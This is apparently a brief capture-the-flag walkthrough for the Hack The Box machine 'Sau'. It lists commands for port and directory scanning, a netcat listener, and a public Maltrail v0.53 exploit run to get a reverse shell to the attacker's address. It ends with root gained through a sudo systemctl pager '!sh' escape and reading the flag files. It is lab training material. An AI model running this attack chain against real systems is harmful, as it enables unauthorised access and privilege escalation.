# ****Sau****

```bash
rustscan -a 10.10.11.224
```

![image](https://github.com/lufffe/Writeups/assets/90646635/357c3476-3b33-4a07-85e9-ef92ae057edd)

```bash
nmap -A -p 22,55555 10.10.11.224
```

![image](https://github.com/lufffe/Writeups/assets/90646635/3af5ddde-27c9-4e00-a834-936613cc6841)

```bash
gobuster dir -u [http://sau.htb:55555](http://sau.htb:55555/) -w directory-list-2.3-small.txt -t 100 --no-error -b 400,404
```

![image](https://github.com/lufffe/Writeups/assets/90646635/f457fc71-4732-4e6a-bf55-3f1dcdf6e84c)

http://sau.htb:55555/web

![image](https://github.com/lufffe/Writeups/assets/90646635/66832557-c07f-4a20-87c3-69ac57d3880c)

![image](https://github.com/lufffe/Writeups/assets/90646635/4614fdd3-0922-4c4e-abea-b01c1da57303)

![image](https://github.com/lufffe/Writeups/assets/90646635/634e7000-e669-4078-bf87-f8de21d859f5)

https://github.com/spookier/Maltrail-v0.53-Exploit

```bash
nc -lnvp 4455
```

```bash
python exploit.py http://10.10.11.224:55555 10.10.14.8 4455
```

```bash
cat /home/puma/user.txt
```

```bash
sudo -l
```

![image](https://github.com/lufffe/Writeups/assets/90646635/9025966b-3a09-49dc-a8c4-c20c7b870a4a)

```bash
sudo /usr/bin/systemctl status trail.service
```

![image](https://github.com/lufffe/Writeups/assets/90646635/5e0c2624-5350-4ca3-849a-3100a9bfdd25)

```bash
!sh
```

![image](https://github.com/lufffe/Writeups/assets/90646635/7f2633cd-e45d-4cd4-8e8e-03308804b7fb)

```bash
cat /root/root.txt
```
